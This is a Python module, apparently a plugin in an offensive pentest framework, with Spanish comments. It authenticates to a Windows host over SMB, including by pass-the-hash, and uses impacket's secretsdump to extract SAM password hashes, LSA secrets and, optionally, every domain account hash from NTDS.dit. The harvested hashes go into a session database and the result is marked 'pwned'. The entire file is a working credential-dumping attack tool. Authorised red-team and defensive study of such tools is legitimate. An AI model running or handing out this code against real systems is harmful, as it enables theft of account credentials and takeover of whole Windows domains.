
# scripts/smb/attack/sam_dump.py
"""
Vuelca hashes SAM/LSA/NTDS.dit via impacket secretsdump.
Requiere admin (DA para NTDS). Guarda los hashes en la DB de sesión.
"""
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
    _OK = True
except ImportError:
    _OK = False


class Script(BaseScript):
    name        = "sam-dump"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Vuelca hashes SAM/LSA/NTDS.dit via secretsdump (impacket). "
        "Requiere admin. Usar --ntds para volcar hashes del controlador de dominio."
    )

    def run(self, **kwargs):
        if not _OK:
            console.print("[red]impacket secretsdump no disponible.[/red]"); return None

        ip      = self.target.ip
        domain  = self.creds.domain   or ""
        user    = self.creds.user     or ""
        passwd  = self.creds.password or ""
        nt_hash = self.creds.hash     or ""
        timeout = self.target.timeout or 5
        do_ntds = bool(kwargs.get("ntds", False))

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        console.print(f"\n[dim][sam-dump] Conectando a {ip}...[/dim]")

        hashes = []
        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, passwd, domain, lm_hash, nt_hash)

            remote_ops = RemoteOperations(conn, False, None)
            remote_ops.enableRegistry()

            try:
                boot_key = remote_ops.getBootKey()

                # SAM
                console.print("[dim][sam-dump] Volcando SAM...[/dim]")
                sam = SAMHashes(remote_ops.getHive("SAM"), boot_key, isRemote=True)
                sam.dump()
                for name, _, _, hash_str in sam.export():
                    entry = f"{name}:{hash_str}"
                    hashes.append(entry)
                    console.print(f"  [cyan]{entry}[/cyan]")
                    session_db.DB.SaveCredential(ip, name, hash_str, "ntlm", False, "sam_dump")
                sam.finish()

                # LSA secrets
                console.print("\n[dim][sam-dump] Volcando secretos LSA...[/dim]")
                lsa = LSASecrets(remote_ops.getHive("SECURITY"), boot_key,
                                  remote_ops, isRemote=True, history=False)
                lsa.dumpSecrets()
                lsa.finish()

                if do_ntds:
                    console.print("\n[dim][sam-dump] Volcando NTDS.dit (puede tardar un momento)...[/dim]")
                    ntds = NTDSHashes(None, boot_key, isRemote=True,
                                       remoteOps=remote_ops, useVSSMethod=False,
                                       justNTLM=True)
                    ntds.dump()
                    ntds.finish()

            finally:
                remote_ops.finish()

            conn.logoff()
        except Exception as e:
            print_result("SMB", ip, "fail", f"Error en secretsdump: {e}"); return None

        print_result("SMB", ip, "pwned", f"{len(hashes)} hash(es) volcado(s) de SAM")
        return hashes
